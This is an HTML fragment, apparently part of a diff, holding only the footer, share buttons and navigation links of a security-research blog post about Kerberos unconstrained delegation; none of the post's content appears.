+          <p class="page__date"><strong><svg class="svg-inline--fa fa-calendar-alt fa-w-14 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="calendar-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M436 160H12c-6.6 0-12-5.4-12-12v-36c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48v36c0 6.6-5.4 12-12 12zM12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm116 204c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40z"></path></svg><!-- <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> --> Updated:</strong> <time datetime="2019-02-18T18:08:57+00:00">February 18, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%22Relaying%22+Kerberos+-+Having+fun+with+unconstrained+delegation%20https%3A%2F%2Fdirkjanm.io%2Fkrbrelayx-unconstrained-delegation-abuse-toolkit%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><svg class="svg-inline--fa fa-twitter fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="fab fa-fw fa-twitter" aria-hidden="true"></i> --><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdirkjanm.io%2Fkrbrelayx-unconstrained-delegation-abuse-toolkit%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><svg class="svg-inline--fa fa-facebook fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i class="fab fa-fw fa-facebook" aria-hidden="true"></i> --><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fdirkjanm.io%2Fkrbrelayx-unconstrained-delegation-abuse-toolkit%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><svg class="svg-inline--fa fa-google-plus fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="google-plus" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M248 8C111.1 8 0 119.1 0 256s111.1 248 248 248 248-111.1 248-248S384.9 8 248 8zm-70.7 372c-68.8 0-124-55.5-124-124s55.2-124 124-124c31.3 0 60.1 11 83 32.3l-33.6 32.6c-13.2-12.9-31.3-19.1-49.4-19.1-42.9 0-77.2 35.5-77.2 78.1s34.2 78.1 77.2 78.1c32.6 0 64.9-19.1 70.1-53.3h-70.1v-42.6h116.9c1.3 6.8 1.9 13.6 1.9 20.7 0 70.8-47.5 121.2-118.8 121.2zm230.2-106.2v35.5H372v-35.5h-35.5v-35.5H372v-35.5h35.5v35.5h35.2v35.5h-35.2z"></path></svg><!-- <i class="fab fa-fw fa-google-plus" aria-hidden="true"></i> --><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdirkjanm.io%2Fkrbrelayx-unconstrained-delegation-abuse-toolkit%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> --><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/abusing-exchange-one-api-call-away-from-domain-admin/" class="pagination--pager" title="Abusing Exchange: One API call away from Domain Admin
+">Previous</a>
+    
+    
+      <a href="/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/" class="pagination--pager" title="The worst of both worlds: Combining NTLM Relaying and Kerberos delegation
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+    
+    
+    
+      <li><a href="https://github.com/dirkjanm"><svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub</a></li>
+    
+    
+    
+    <li><a href="/feed.xml"><svg class="svg-inline--fa fa-rss-square fa-w-14 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="rss-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM112 416c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm157.533 0h-34.335c-6.011 0-11.051-4.636-11.442-10.634-5.214-80.05-69.243-143.92-149.123-149.123-5.997-.39-10.633-5.431-10.633-11.441v-34.335c0-6.535 5.468-11.777 11.994-11.425 110.546 5.974 198.997 94.536 204.964 204.964.352 6.526-4.89 11.994-11.425 11.994zm103.027 0h-34.334c-6.161 0-11.175-4.882-11.427-11.038-5.598-136.535-115.204-246.161-251.76-251.76C68.882 152.949 64 147.935 64 141.774V107.44c0-6.454 5.338-11.664 11.787-11.432 167.83 6.025 302.21 141.191 308.205 308.205.232 6.449-4.978 11.787-11.432 11.787z"></path></svg><!-- <i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> --> Feed</a></li>
+    <li><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="/assets/img/cc-by.png"></a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">All blog content is available under the <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons BY 4.0 License</a> unless stated otherwise.
+  <br>Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> and a modified version of the "Minimal Mistakes" theme.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-G3JYRDGZVR"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G3JYRDGZVR', { 'anonymize_ip': false});
+</script>
+
+
+
+
+
+
+
+  
+</body></html>
